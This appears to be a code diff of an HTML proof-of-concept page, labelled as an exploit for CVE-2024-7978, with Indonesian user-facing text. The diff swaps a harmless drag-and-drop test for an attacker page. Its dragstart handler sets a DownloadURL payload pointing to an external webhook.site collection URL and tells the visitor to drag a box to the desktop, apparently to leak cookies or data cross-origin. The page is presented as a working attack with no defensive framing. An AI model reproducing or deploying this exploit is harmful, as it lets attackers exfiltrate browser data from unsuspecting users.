@@ -2,67 +2,46 @@
 <html>
 
 <head>
-    <title>PoC - DnD Sandbox Bypass</title>
+    <title>PoC - CVE-2024-7978 (Cookie Leak)</title>
     <style>
         body {
-            background-color: #e3f2fd;
+            background: #222;
+            color: #fff;
             font-family: sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
+            text-align: center;
+            padding: 50px;
         }
 
         #dragTarget {
-            width: 250px;
-            height: 150px;
-            background-color: #1976d2;
+            width: 300px;
+            height: 100px;
+            background: #e91e63;
             color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            border-radius: 15px;
-            cursor: grab;
+            line-height: 100px;
             font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            user-select: none;
-        }
-
-        #dragTarget:active {
-            cursor: grabbing;
-        }
-
-        .instruction {
-            margin-top: 20px;
-            color: #333;
+            cursor: grab;
+            margin: auto;
         }
     </style>
 </head>
 
 <body>
-
-    <h3>Situs A (Drag and Drop Context)</h3>
+    <h3>Situs A (Attacker)</h3>
 
     <div id="dragTarget" draggable="true">
-        KLIK & SERET SAYA <br> KE DESKTOP / FOLDER
+        TARIK GUA KE DESKTOP LU!
     </div>
-
-    <p class="instruction">Tarik kotak biru di atas keluar dari browser ke desktop kamu.</p>
 
     <script>
         const dragTarget = document.getElementById('dragTarget');
 
         dragTarget.addEventListener('dragstart', (e) => {
-            console.log("Drag started - Attempting OS-level escape...");
-            const fileName = "pwned_sandbox.txt";
-            const fileContent = "data:text/plain;base64,U2FuZGJveCBCeXBhc3MgdmlhIERyYWcgYW5kIERyb3AgaXMgU3VjY2VzcyE=";
-            const downloadData = `text/plain:${fileName}:${fileContent}`;
-            e.dataTransfer.setData("DownloadURL", downloadData);
-            e.dataTransfer.setData("text/plain", "Ini hasil bypass sandbox");
+            console.log("Menyiapkan payload Cross-Origin Download...");
+            const targetURL = "https://webhook.site/b7abc49c-2c82-4702-b740-206808415cbd";
+            const payload = `application/octet-stream:hasil_leak.txt:${targetURL}`;
+
+            e.dataTransfer.setData('DownloadURL', payload);
+            e.dataTransfer.effectAllowed = 'all';
         });
     </script>
 </body>
